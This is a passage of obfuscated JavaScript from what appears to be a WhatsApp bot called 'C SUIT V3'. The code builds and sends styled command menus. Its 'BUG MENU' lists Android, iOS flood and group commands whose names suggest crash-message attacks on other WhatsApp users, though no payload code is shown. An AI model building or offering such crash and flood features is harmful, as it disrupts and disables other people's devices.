        xmenu_oh = "\nᗷᑌᘜ ᗰᗴᑎᑌ \n*𝙾𝚆𝙽𝙴𝚁: " + global.ownername + "*\n*𝙿𝚁𝙴𝙵𝙸𝚇: ⌕" + global.prefa + "⌕*\n*𝚄𝙿𝚃𝙸𝙼𝙴: " + runtime(process.uptime()) + "*\n*𝙰𝙲𝙲𝙾𝚄𝙽𝚃 𝚃𝚈𝙿𝙴: " + (_0x2fc88e ? "Premium" : "Free") + "*\n*𝙷𝙾𝚂𝚃: " + os.hostname() + "*\n*𝙿𝙻𝙰𝚃𝙵𝙾𝚁𝙼: " + os.platform() + "*\n■□■□■□■□□■□■□□■□■□\n> 𝙷𝙴𝙻𝙻𝙾 " + _0x19720f + "\n□■□■□■□■□□■□■□■□■□\n" + readmore + "\n\n ᗩᑎᗪᖇOIᗪ \n \n> 𝙻𝙾𝚂𝚃𝙱𝙾𝚈𝙷𝙸𝚃\n> 𝙻𝙾𝚁𝙳\n> 𝙲𝚂𝚄𝙸𝚃𝚂𝙷𝙾𝚃\n> 𝙿𝟷\n> 𝚃𝙰𝙲𝙺𝙻𝙴\n> 𝙻𝙰𝚅𝙰\n> 𝙿𝙴𝙽𝙴𝚃𝚁𝙰𝚃𝙴\n\n IOՏ \n \n> 𝙵𝙻𝙾𝙾𝙳𝙴𝙳\n\n ᘜᑕ \n \n> 𝙳𝙶𝙲\n▂ ▄ ▅ ▆ ▇ ꉓꌗꀎꀤ꓄ V3▇ ▆ ▅ ▄ ▂";
        if (typemenu === 'v1') {
          _0x239047.sendMessage(_0x5f530e.chat, {
            'text': xmenu_oh,
            'contextInfo': {
              'externalAdReply': {
                'title': botname,
                'body': ownername,
                'thumbnailUrl': "https://files.catbox.moe/0i4wiu.png",
                'sourceUrl': link,
                'mediaType': 0x1,
                'renderLargerThumbnail': true
              }
            }
          }, {
            'quoted': _0x5f530e
          });
        } else {
          if (typemenu === 'v2') {
            _0x239047.sendMessage(_0x5f530e.chat, {
              'video': fs.readFileSync("./C-SMedia/11.mp3"),
              'gifPlayback': true,
              'caption': xmenu_oh,
              'contextInfo': {
                'externalAdReply': {
                  'title': botname,
                  'body': ownername,
                  'thumbnailUrl': 'https://files.catbox.moe/l1srou.jpg',
                  'sourceUrl': '',
                  'mediaType': 0x1,
                  'renderLargerThumbnail': true
                }
              }
            }, {
              'quoted': _0x5f530e
            });
          } else {
            if (typemenu === 'v3') {
              _0x239047.sendMessage(_0x5f530e.chat, {
                'video': fs.readFileSync("./C-SMedia/11.mp3"),
                'caption': xmenu_oh,
                'gifPlayback': true
              }, {
                'quoted': _0x5f530e
              });
            } else if (typemenu === 'v4') {
              _0x239047.relayMessage(_0x5f530e.chat, {
                'scheduledCallCreationMessage': {
                  'callType': "AUDIO",
                  'scheduledTimestampMs': 0x4b0,
                  'title': xmenu_oh
                }
              }, {});
            }
          }
        }
        break;
      case "ownermenu2":
        xmenu_oh = "\n*𝙾𝚆𝙽𝙴𝚁: " + global.ownername + "*\n*𝙿𝚁𝙴𝙵𝙸𝚇: ⌕" + global.prefa + "⌕*\n*𝚄𝙿𝚃𝙸𝙼𝙴: " + runtime(process.uptime()) + "*\n*𝙰𝙲𝙲𝙾𝚄𝙽𝚃 𝚃𝚈𝙿𝙴: " + (_0x2fc88e ? "Premium" : "Free") + "*\n*𝙷𝙾𝚂𝚃: " + os.hostname() + "*\n*𝙿𝙻𝙰𝚃𝙵𝙾𝚁𝙼: " + os.platform() + "*\n■□■□■□■□□■□■□□■□■□\n> 𝙷𝙴𝙻𝙻𝙾 " + _0x19720f + "\n□■□■□■□■□□■□■□■□■□\n" + readmore + "\n Oᗯᑎᗴᖇ ᗰᗴᑎᑌ \n\n> 𝙶𝙴𝚃𝚂𝙴𝚂𝚂𝙸𝙾𝙽\n> 𝙳𝙴𝙻𝙴𝚃𝙴𝚂𝙴𝚂𝚂𝙸𝙾𝙽\n> 𝙹𝙾𝙸𝙽\n> 𝚂𝙷𝚄𝚃𝙳𝙾𝚆𝙽\n> 𝚁𝙴𝚂𝚃𝙰𝚁𝚃\n> 𝙰𝚄𝚃𝙾𝚁𝙴𝙰𝙳 𝙾𝙽/𝙾𝙵𝙵\n> 𝙰𝚄𝚃𝙾𝚃𝚈𝙿𝙸𝙽𝙶 𝙾𝙽/𝙾𝙵𝙵\n> 𝙰𝚄𝚃𝙾𝚁𝙴𝙲𝙾𝚁𝙳𝙸𝙽𝙶 𝙾𝙽/𝙾𝙵𝙵\n> 𝙰𝚄𝚃𝙾𝚁𝙴𝙲𝙾𝚁𝙳𝚃𝚈𝙿 𝙾𝙽/𝙾𝙵𝙵\n> 𝙰𝚄𝚃𝙾𝙱𝙸𝙾 𝙾𝙽/𝙾𝙵𝙵\n> 𝙰𝚄𝚃𝙾𝚂𝚃𝙰𝚃𝚄𝚂𝚅𝙸𝙴𝚆 𝙾𝙽/𝙾𝙵𝙵\n> 𝙼𝙾𝙳𝙴 𝙿𝚄𝙱𝙻𝙸𝙲/𝚂𝙴𝙻𝙵\n> 𝙱𝙻𝙾𝙲𝙺\n> 𝚄𝙽𝙱𝙻𝙾𝙲𝙺\n> 𝙱𝙰𝙲𝙺𝚄𝙿\n> 𝙶𝙴𝚃𝙲𝙰𝚂𝙴\n> 𝙰𝙳𝙳𝙾𝚆𝙽𝙴𝚁\n> 𝙳𝙴𝙻𝙾𝚆𝙽𝙴𝚁\n▂ ▄ ▅ ▆ ▇ ꉓꌗꀎꀤ꓄ V3▇ ▆ ▅ ▄ ▂ ";
        if (typemenu === 'v1') {
          _0x239047.sendMessage(_0x5f530e.chat, {
            'text': xmenu_oh,
            'contextInfo': {
              'externalAdReply': {
                'title': botname,
                'body': ownername,
                'thumbnailUrl': "https://files.catbox.moe/s7huhm.jpg",
                'sourceUrl': link,
                'mediaType': 0x1,
                'renderLargerThumbnail': true
              }
            }
          }, {
            'quoted': _0x5f530e
          });
        } else {
          if (typemenu === 'v2') {
            _0x239047.sendMessage(_0x5f530e.chat, {
              'video': fs.readFileSync('./C-SMedia/11.mp3'),
              'gifPlayback': true,
              'caption': xmenu_oh,
              'contextInfo': {
                'externalAdReply': {
                  'title': botname,
                  'body': ownername,
                  'thumbnailUrl': 'https://files.catbox.moe/s7huhm.jpg',
                  'sourceUrl': '',
                  'mediaType': 0x1,
                  'renderLargerThumbnail': true
                }
              }
            }, {
              'quoted': _0x5f530e
            });
          } else {
            if (typemenu === 'v3') {
              _0x239047.sendMessage(_0x5f530e.chat, {
                'video': fs.readFileSync("./C-SMedia/11.mp3"),
                'caption': xmenu_oh,
                'gifPlayback': true
              }, {
                'quoted': _0x5f530e
              });
            } else if (typemenu === 'v4') {
              _0x239047.relayMessage(_0x5f530e.chat, {
                'scheduledCallCreationMessage': {
                  'callType': "AUDIO",
                  'scheduledTimestampMs': 0x4b0,
                  'title': xmenu_oh
                }
              }, {});
            }
          }
        }
        break;
      case "convertmenu2":
        xmenu_oh = "\n*𝙾𝚆𝙽𝙴𝚁: " + global.ownername + "*\n*𝙿𝚁𝙴𝙵𝙸𝚇: ⌕" + global.prefa + "⌕*\n*𝚄𝙿𝚃𝙸𝙼𝙴: " + runtime(process.uptime()) + "*\n*𝙰𝙲𝙲𝙾𝚄𝙽𝚃 𝚃𝚈𝙿𝙴: " + (_0x2fc88e ? 'Premium' : "Free") + "*\n*𝙷𝙾𝚂𝚃: " + os.hostname() + "*\n*𝙿𝙻𝙰𝚃𝙵𝙾𝚁𝙼: " + os.platform() + "*\n■□■□■□■□□■□■□□■□■□\n> 𝙷𝙴𝙻𝙻𝙾 " + _0x19720f + "\n□■□■□■□■□□■□■□■□■□\n" + readmore + "\n ᑕOᑎᐯᗴᖇT ᗰᗴᑎᑌ\n \n> 𝚂𝚃𝙸𝙺𝙴𝚁\n> 𝚂𝙼𝙴𝙼𝙴\n> 𝚃𝙾𝙸𝙼𝙰𝙶𝙴\n> 𝚃𝙾𝚅𝙸𝙳𝙴𝙾\n> 𝚃𝙾𝙰𝚄𝙳𝙸𝙾\n> 𝚃𝙾𝙼𝙿𝟹\n> 𝚃𝙾𝚅𝙽\n> 𝚃𝙾𝙶𝙸𝙵\n> 𝚃𝙾𝚄𝚁𝙻\n> 𝚃𝙾𝚀𝚁\n> 𝚃𝙾𝚅𝙸𝙴𝚆𝙾𝙽𝙲𝙴\n> 𝙵𝙻𝙸𝙿𝚃𝙴𝚇𝚃\n> 𝙴𝙼𝙾𝙹𝙸𝙼𝙸𝚇\n▂ ▄ ▅ ▆ ▇ ꉓꌗꀎꀤ꓄ V3▇ ▆ ▅ ▄ ▂ ";
        if (typemenu === 'v1') {
          _0x239047.sendMessage(_0x5f530e.chat, {
            'text': xmenu_oh,
            'contextInfo': {
              'externalAdReply': {
                'title': botname,
                'body': ownername,
                'thumbnailUrl': "https://files.catbox.moe/s7huhm.jpg",
                'sourceUrl': link,
                'mediaType': 0x1,
                'renderLargerThumbnail': true
              }
            }
          }, {
            'quoted': _0x5f530e
          });
        } else {
          if (typemenu === 'v2') {
            _0x239047.sendMessage(_0x5f530e.chat, {
              'video': fs.readFileSync("./C-SMedia/11.mp3"),
              'gifPlayback': true,
              'caption': xmenu_oh,
              'contextInfo': {
                'externalAdReply': {
                  'title': botname,
                  'body': ownername,
                  'thumbnailUrl': "https://files.catbox.moe/8x33pv.jpg",
                  'sourceUrl': '',
                  'mediaType': 0x1,
                  'renderLargerThumbnail': true
                }
              }
            }, {
              'quoted': _0x5f530e
            });
          } else {
            if (typemenu === 'v3') {
              _0x239047.sendMessage(_0x5f530e.chat, {
                'video': fs.readFileSync("./C-SMedia/11.mp3"),
                'caption': xmenu_oh,
                'gifPlayback': true
              }, {
                'quoted': _0x5f530e
              });
            } else if (typemenu === 'v4') {
              _0x239047.relayMessage(_0x5f530e.chat, {
                'scheduledCallCreationMessage': {
                  'callType': "AUDIO",
                  'scheduledTimestampMs': 0x4b0,
                  'title': xmenu_oh
                }
              }, {});
            }
          }
        }
        break;
      case "databasemenu2":
        xmenu_oh = "\n*𝙾𝚆𝙽𝙴𝚁: " + global.ownername + "*\n*𝙿𝚁𝙴𝙵𝙸𝚇: ⌕" + global.prefa + "⌕*\n*𝚄𝙿𝚃𝙸𝙼𝙴: " + runtime(process.uptime()) + "*\n*𝙰𝙲𝙲𝙾𝚄𝙽𝚃 𝚃𝚈𝙿𝙴: " + (_0x2fc88e ? "Premium" : "Free") + "*\n*𝙷𝙾𝚂𝚃: " + os.hostname() + "*\n*𝙿𝙻𝙰𝚃𝙵𝙾𝚁𝙼: " + os.platform() + "*\n■□■□■□■□□■□■□□■□■□\n> 𝙷𝙴𝙻𝙻𝙾 " + _0x19720f + "\n□■□■□■□■□□■□■□■□■□\n" + readmore + "\n ᗪᗩTᗩᗷᗩՏᗴ ᗰᗴᑎᑌ \n \n> 𝙰𝙳𝙳𝚅𝙸𝙳𝙴𝙾\n> 𝙰𝙳𝙳𝙸𝙼𝙰𝙶𝙴\n> 𝙰𝙳𝙳𝚂𝚃𝙸𝙲𝙺𝙴𝚁\n> 𝙰𝙳𝙳𝚅𝙽\n> 𝙰𝙳𝙳𝚉𝙸𝙿\n> 𝙰𝙳𝙳𝙰𝙿𝙺\n> 𝙰𝙳𝙳𝙿𝙳𝙵\n> 𝙳𝙴𝙻𝚅𝙸𝙳𝙴𝙾\n> 𝙳𝙴𝙻𝙸𝙼𝙰𝙶𝙴\n> 𝙳𝙴𝙻𝚂𝚃𝙸𝙲𝙺𝙴𝚁\n> 𝙳𝙴𝙻𝚅𝙽\n> 𝙳𝙴𝙻𝚉𝙸𝙿\n> 𝙳𝙴𝙻𝙰𝙿𝙺\n> 𝙳𝙴𝙻𝙿𝙳𝙵\n> 𝙻𝙸𝚂𝚃𝚅𝙸𝙳𝙴𝙾\n> 𝙻𝙸𝚂𝚃𝙸𝙼𝙰𝙶𝙴\n> 𝙻𝙸𝚂𝚃𝚂𝚃𝙸𝙲𝙺𝙴𝚁\n> 𝙻𝙸𝚂𝚃𝚅𝙽\n> 𝙻𝙸𝚂𝚃𝚉𝙸𝙿\n> 𝙻𝙸𝚂𝚃𝙰𝙿𝙺\n> 𝙻𝙸𝚂𝚃𝙿𝙳𝙵\n▂ ▄ ▅ ▆ ▇ ꉓꌗꀎꀤ꓄ V3▇ ▆ ▅ ▄ ▂ ";
        if (typemenu === 'v1') {
          _0x239047.sendMessage(_0x5f530e.chat, {
            'text': xmenu_oh,
            'contextInfo': {
              'externalAdReply': {
                'title': botname,
                'body': ownername,
                'thumbnailUrl': "https://files.catbox.moe/8x33pv.jpg",
                'sourceUrl': link,
                'mediaType': 0x1,
                'renderLargerThumbnail': true
              }
            }
          }, {
            'quoted': _0x5f530e
          });
        } else {
          if (typemenu === 'v2') {
            _0x239047.sendMessage(_0x5f530e.chat, {
              'video': fs.readFileSync('./C-SMedia/11.mp3'),
              'gifPlayback': true,
              'caption': xmenu_oh,
              'contextInfo': {
                'externalAdReply': {
                  'title': botname,
                  'body': ownername,
                  'thumbnailUrl': "https://files.catbox.moe/8x33pv.jpg",
                  'sourceUrl': '',
                  'mediaType': 0x1,
                  'renderLargerThumbnail': true
                }
              }
            }, {
              'quoted': _0x5f530e
            });
          } else {
            if (typemenu === 'v3') {
              _0x239047.sendMessage(_0x5f530e.chat, {
                'video': fs.readFileSync("./C-SMedia/11.mp3"),
                'caption': xmenu_oh,
                'gifPlayback': true
              }, {
                'quoted': _0x5f530e
              });
            } else if (typemenu === 'v4') {
              _0x239047.relayMessage(_0x5f530e.chat, {
                'scheduledCallCreationMessage': {
                  'callType': 'AUDIO',
                  'scheduledTimestampMs': 0x4b0,
                  'title': xmenu_oh
                }
              }, {});
            }
          }
        }
        break;
      case "downloadmenu2":
        xmenu_oh = "\n*𝙾𝚆𝙽𝙴𝚁: " + global.ownername + "*\n*𝙿𝚁𝙴𝙵𝙸𝚇: ⌕" + global.prefa + "⌕*\n*𝚄𝙿𝚃𝙸𝙼𝙴: " + runtime(process.uptime()) + "*\n*𝙰𝙲𝙲𝙾𝚄𝙽𝚃 𝚃𝚈𝙿𝙴: " + (_0x2fc88e ? 'Premium' : "Free") + "*\n*𝙷𝙾𝚂𝚃: " + os.hostname() + "*\n*𝙿𝙻𝙰𝚃𝙵𝙾𝚁𝙼: " + os.platform() + "*\n■□■□■□■□□■□■□□■□■□\n> 𝙷𝙴𝙻𝙻𝙾 " + _0x19720f + "\n□■□■□■□■□□■□■□■□■□\n" + readmore + "\nᗪOᗯᑎᒪOᗩᗪ ᗰᗴᑎᑌ\n\n> 𝙶𝙸𝚃\n> 𝙶𝙸𝚃𝙲𝙻𝙾𝙽𝙴\n> 𝙿𝙻𝙰𝚈\n> 𝚈𝚃𝙼𝙿𝟹\n> 𝚈𝚃𝙼𝙿𝟺\n> 𝚂𝙾𝚄𝙽𝙳 𝟷 - 𝚂𝙾𝚄𝙽𝙳𝟷𝟼𝟷\n▂ ▄ ▅ ▆ ▇ ꉓꌗꀎꀤ꓄ V3▇ ▆ ▅ ▄ ▂ ";
        if (typemenu === 'v1') {
          _0x239047.sendMessage(_0x5f530e.chat, {
            'text': xmenu_oh,
            'contextInfo': {
              'externalAdReply': {
                'title': botname,
                'body': ownername,
                'thumbnailUrl': "https://files.catbox.moe/8x33pv.jpg",
                'sourceUrl': link,
                'mediaType': 0x1,
                'renderLargerThumbnail': true
              }
            }
          }, {
            'quoted': _0x5f530e
          });
        } else {
          if (typemenu === 'v2') {
            _0x239047.sendMessage(_0x5f530e.chat, {
              'video': fs.readFileSync("./C-SMedia/11.mp3"),
              'gifPlayback': true,
              'caption': xmenu_oh,
              'contextInfo': {
                'externalAdReply': {
                  'title': botname,
                  'body': ownername,
                  'thumbnailUrl': "https://files.catbox.moe/8x33pv.jpg",
                  'sourceUrl': '',
                  'mediaType': 0x1,
                  'renderLargerThumbnail': true
                }
              }
            }, {
              'quoted': _0x5f530e
            });
          } else {
            if (typemenu === 'v3') {
              _0x239047.sendMessage(_0x5f530e.chat, {
                'video': fs.readFileSync('./C-SMedia/11.mp3'),
                'caption': xmenu_oh,
                'gifPlayback': true
              }, {
                'quoted': _0x5f530e
              });
            } else if (typemenu === 'v4') {
              _0x239047.relayMessage(_0x5f530e.chat, {
                'scheduledCallCreationMessage': {
                  'callType': 'AUDIO',
                  'scheduledTimestampMs': 0x4b0,
                  'title': xmenu_oh
                }
              }, {});
            }
          }
        }
        break;
      case "animemenu2":
        xmenu_oh = "\n■□■□■□■□□■□■□□■□■□\n> Hello " + _0x19720f + "\n□■□■□■□■□□■□■□■□■□\n> ╰⭑➤⭑➤ " + lostboytimewisher + " 😇\n" + readmore + "\n\n *𝙾𝚆𝙽𝙴𝚁: " + global.ownername + "*\n*𝙿𝚁𝙴𝙵𝙸𝚇: ⌕" + global.prefa + "⌕*\n*𝚄𝙿𝚃𝙸𝙼𝙴: " + runtime(process.uptime()) + "*\n*𝙰𝙲𝙲𝙾𝚄𝙽𝚃 𝚃𝚈𝙿𝙴: " + (_0x2fc88e ? "Premium" : "Free") + "*\n*𝙷𝙾𝚂𝚃: " + os.hostname() + "*\n*𝙿𝙻𝙰𝚃𝙵𝙾𝚁𝙼: " + os.platform() + "*\n■□■□■□■□□■□■□□■□■□\n> 𝙷𝙴𝙻𝙻𝙾 " + _0x19720f + "\n□■□■□■□■□□■□■□■□■□\n" + readmore + "\n  ᗩᑎIᗰᗴ ᗰᗴᑎᑌ\n\n> 𝚂𝚃𝙸𝙲𝙺𝙰𝚆𝙾𝙾\n> 𝚂𝚃𝙸𝙲𝙺𝚆𝙰𝚅𝙴\n> 𝚂𝚃𝙸𝙲𝙺𝙴𝚁𝙱𝙻𝚄𝚂𝙷\n> 𝚂𝚃𝙸𝙲𝙺𝙲𝚁𝙸𝙽𝙶𝙴\n> 𝚂𝚃𝙸𝙲𝙺𝙷𝙰𝙿𝙿𝚈\n> 𝚂𝚃𝙸𝙲𝙺𝙶𝙻𝙾𝙼𝙿\n> 𝚂𝚃𝙸𝙲𝙺𝙳𝙰𝙽𝙲𝙴\n> 𝚂𝚃𝙸𝙲𝙺𝙼𝚄𝙶\n> 𝚂𝚃𝙸𝙲𝙺𝙷𝙸𝙶𝙷𝙵𝙸𝚅𝙴\n> 𝚂𝚃𝙸𝙲𝙺𝚂𝙷𝙸𝙽𝙾𝙱𝚄\n> 𝚂𝚃𝙸𝙲𝙺𝙲𝚄𝙳𝙳𝙻𝙴\n                    ▂ ▄ ▅ ▆ ▇ ꉓꌗꀎꀤ꓄ V3▇ ▆ ▅ ▄ ▂ ";
        if (typemenu === 'v1') {
          _0x239047.sendMessage(_0x5f530e.chat, {
            'text': xmenu_oh,
            'contextInfo': {
              'externalAdReply': {
                'title': botname,
                'body': ownername,
                'thumbnailUrl': "https://files.catbox.moe/l1srou.jpg",
                'sourceUrl': link,
                'mediaType': 0x1,
                'renderLargerThumbnail': true
              }
            }
          }, {
            'quoted': _0x5f530e
          });
        } else {
          if (typemenu === 'v2') {
            _0x239047.sendMessage(_0x5f530e.chat, {
              'video': fs.readFileSync("./C-SMedia/11.mp3"),
              'gifPlayback': true,
              'caption': xmenu_oh,
              'contextInfo': {
                'externalAdReply': {
                  'title': botname,
                  'body': ownername,
                  'thumbnailUrl': 'https://files.catbox.moe/l1srou.jpg',
                  'sourceUrl': '',
                  'mediaType': 0x1,
                  'renderLargerThumbnail': true
                }
              }
            }, {
              'quoted': _0x5f530e
            });
          } else {
            if (typemenu === 'v3') {
              _0x239047.sendMessage(_0x5f530e.chat, {
                'video': fs.readFileSync("./C-SMedia/11.mp3"),
                'caption': xmenu_oh,
                'gifPlayback': true
              }, {
                'quoted': _0x5f530e
              });
            } else if (typemenu === 'v4') {
              _0x239047.relayMessage(_0x5f530e.chat, {
                'scheduledCallCreationMessage': {
                  'callType': 'AUDIO',
                  'scheduledTimestampMs': 0x4b0,
                  'title': xmenu_oh
                }
              }, {});
            }
          }
        }
        break;
      case "cpanelmenu2":
        xmenu_oh = "\n*𝙾𝚆𝙽𝙴𝚁: " + global.ownername + "*\n*𝙿𝚁𝙴𝙵𝙸𝚇: ⌕" + global.prefa + "⌕*\n*𝚄𝙿𝚃𝙸𝙼𝙴: " + runtime(process.uptime()) + "*\n*𝙰𝙲𝙲𝙾𝚄𝙽𝚃 𝚃𝚈𝙿𝙴: " + (_0x2fc88e ? 'Premium' : "Free") + "*\n*𝙷𝙾𝚂𝚃: " + os.hostname() + "*\n*𝙿𝙻𝙰𝚃𝙵𝙾𝚁𝙼: " + os.platform() + "*\n■□■□■□■□□■□■□□■□■□\n> 𝙷𝙴𝙻𝙻𝙾 " + _0x19720f + "\n□■□■□■□■□□■□■□■□■□\n" + readmore + "\n ᑕᑭᗩᑎᗴᒪ ᗰᗴᑎᑌ\n \n> 𝙻𝙸𝚂𝚃𝚁𝙰𝙼\n> 𝙻𝙸𝚂𝚃𝚂𝚁𝚅\n> 𝙰𝙳𝙳𝙿𝚁𝙴𝙼\n> 𝙿𝙰𝙽𝙴𝙻𝙼𝙴𝙽𝚄\n> 𝙿𝙰𝚈\n> 𝙾𝚆𝙽𝙴𝚁\n▂ ▄ ▅ ▆ ▇ ꉓꌗꀎꀤ꓄ V3▇ ▆ ▅ ▄ ▂ ";
        if (typemenu === 'v1') {
          _0x239047.sendMessage(_0x5f530e.chat, {
            'text': xmenu_oh,
            'contextInfo': {
              'externalAdReply': {
                'title': botname,
                'body': ownername,
                'thumbnailUrl': "https://files.catbox.moe/l1srou.jpg",
                'sourceUrl': link,
                'mediaType': 0x1,
                'renderLargerThumbnail': true
              }
            }
          }, {
            'quoted': _0x5f530e
          });
        } else {
          if (typemenu === 'v2') {
            _0x239047.sendMessage(_0x5f530e.chat, {
              'video': fs.readFileSync('./C-SMedia/11.mp3'),
              'gifPlayback': true,
              'caption': xmenu_oh,
              'contextInfo': {
                'externalAdReply': {
                  'title': botname,
                  'body': ownername,
                  'thumbnailUrl': 'https://files.catbox.moe/l1srou.jpg',
                  'sourceUrl': '',
                  'mediaType': 0x1,
                  'renderLargerThumbnail': true
                }
              }
            }, {
              'quoted': _0x5f530e
            });
          } else {
            if (typemenu === 'v3') {
              _0x239047.sendMessage(_0x5f530e.chat, {
                'video': fs.readFileSync("./C-SMedia/11.mp3"),
                'caption': xmenu_oh,
                'gifPlayback': true
              }, {
                'quoted': _0x5f530e
              });
            } else if (typemenu === 'v4') {
              _0x239047.relayMessage(_0x5f530e.chat, {
                'scheduledCallCreationMessage': {
                  'callType': 'AUDIO',
                  'scheduledTimestampMs': 0x4b0,
                  'title': xmenu_oh
                }
              }, {});
            }
          }
        }
        break;
      case "menu":
        {
          await _0x239047.sendMessage(_0x5f530e.chat, {
            'react': {
              'text': '💣',
              'key': _0x5f530e.key
            }
          });
          const _0x7f6771 = "C SUIT V3\n*𝙾𝚆𝙽𝙴𝚁: " + global.ownername + "*\n*𝙿𝚁𝙴𝙵𝙸𝚇: ⌕" + global.prefa + "⌕*\n*𝚄𝙿𝚃𝙸𝙼𝙴: " + runtime(process.uptime()) + "*\n*𝙰𝙲𝙲𝙾𝚄𝙽𝚃 𝚃𝚈𝙿𝙴: " + (_0x2fc88e ? "Premium" : "Free") + "*\n*𝙷𝙾𝚂𝚃: " + os.hostname() + "*\n*𝙿𝙻𝙰𝚃𝙵𝙾𝚁𝙼: " + os.platform() + "*\n\n■□■□■□■□□■□■□□■□■□\n> 𝙷𝙴𝙻𝙻𝙾 " + _0x19720f + "\n□■□■□■□■□□■□■□■□■□\n\n ᴘʀᴇꜱꜱ ʙᴜᴛᴛᴏɴ ʙᴇʟʟᴏᴡ!";
          let _0x270311 = {
            'image': {
              'url': "https://files.catbox.moe/8x33pv.jpg"
            },
            'gifPlayback': true,
            'caption': _0x7f6771,
            'contextInfo': {
              'externalAdReply': {
                'title': "🏷 C SUIT V3",
                'body': "LOSTBOY SOLOS",
                'showAdAttribution': true,
                'thumbnailUrl': "https://files.catbox.moe/l1srou.jpg",
                'mediaType': 0x4,
                'MediaUrl': "https://files.catbox.moe/l1srou.jpg",
                'sourceUrl': "https://whatsapp.com/channel/0029ValF0TZEAKWNPknJ6I0I"
              }
            },
            'footer': "© C SUIT",
            'buttons': [{
              'buttonId': "ownermenu",
              'buttonText': {
                'displayText': '𝙾𝚆𝙽𝙴𝚁𝙼𝙴𝙽𝚄'
              },
              'type': 0x1
            }, {
              'buttonId': "cpanelmenu",
              'buttonText': {
                'displayText': "𝙲𝙿𝙰𝙽𝙴𝙻𝙼𝙴𝙽𝚄"
              },
              'type': 0x1
            }, {
              'buttonId': "downloadmenu",
              'buttonText': {
                'displayText': "𝙳𝙾𝚆𝙽𝙻𝙾𝙰𝙳𝙼𝙴𝙽𝚄"
              },
              'type': 0x1
            }],
            'viewOnce': true,
            'headerType': 0x4
          };
          const _0x4ea8e7 = [{
            'buttonId': "action",
            'buttonText': {
              'displayText': "This Button List"
            },
            'type': 0x4,
            'nativeFlowInfo': {
              'name': 'single_select',
              'paramsJson': JSON.stringify({
                'title': "𝗦𝗲𝗹𝗲𝗰𝘁 𝗠𝗲𝗻𝘂",
                'sections': [{
                  'title': "This is a frequently used command",
                  'highlight_label': 'POPULER',
                  'rows': [{
                    'title': "👑 𝗔𝗟𝗟 𝗠𝗘𝗡𝗨",
                    'description': '❄',
                    'id': ".allmenu"
                  }]
                }, {
                  'title': "Please select the menu button below",
                  'highlight_label': "Show ",
                  'rows': [{
                    'title': 'Ownermenu',
                    'description': '💯',
                    'id': "👑 𝐎𝐰𝐧𝐞𝐫𝐦𝐞𝐧𝐮"
                  }, {
                    'title': "bugmenu",
                    'description': '🦠',
                    'id': ".👑 𝐁𝐮𝐠𝐦𝐞𝐧𝐮"
                  }, {
                    'title': 'funmenu',
                    'description': '👾',
                    'id': ".👑 𝐅𝐔𝐍𝐌𝐄𝐍𝐔"
                  }, {
                    'title': "databasemenu",
                    'description': "🦠🚫",
                    'id': ".👑 𝐃𝐀𝐓𝐀𝐁𝐀𝐒𝐄𝐌𝐄𝐍𝐔"
                  }, {
                    'title': 'downloadmenu',
                    'description': "🦠🚫",
                    'id': ".👑 𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃𝐌𝐄𝐍𝐔"
                  }, {
                    'title': "mainmenu",
                    'description': "🦠🚫",
                    'id': ".👑 𝐌𝐀𝐈𝐍𝐌𝐄𝐍𝐔"
                  }, {
                    'title': 'creampiemenu',
                    'description': '🦠🚫',
                    'id': ".👑 𝐂𝐑𝐄𝐀𝐌𝐏𝐈𝐄𝐌𝐄𝐍𝐔"
                  }, {
                    'title': "Animemenu",
                    'description': '🦠🚫',
                    'id': ".👑 𝐀𝐍𝐈𝐌𝐄𝐌𝐄𝐍𝐔"
                  }, {
                    'title': "Cpanelmenu",
                    'description': "🦠✳️",
                    'id': ".👑 𝐂𝐏𝐀𝐍𝐄𝐋𝐌𝐄𝐍𝐔"
                  }]
                }]
              })
            },
            'viewOnce': true
          }];
          _0x270311.buttons.push(..._0x4ea8e7);
          await _0x239047.sendMessage(_0x5f530e.chat, _0x270311, {
            'quoted': _0x5f530e
          });
          await sleep(0x7d0);
          await _0x239047.sendMessage(_0x5f530e.chat, {
            'audio': darkphonk,
            'mimetype': "audio/mpeg"
          }, {
            'quoted': _0x5f530e
          });
        }
        break;
      case "allmenu":
        {
          await _0x239047.sendMessage(_0x5f530e.chat, {
            'react': {
              'text': '🤡',
              'key': _0x5f530e.key
            }
          });
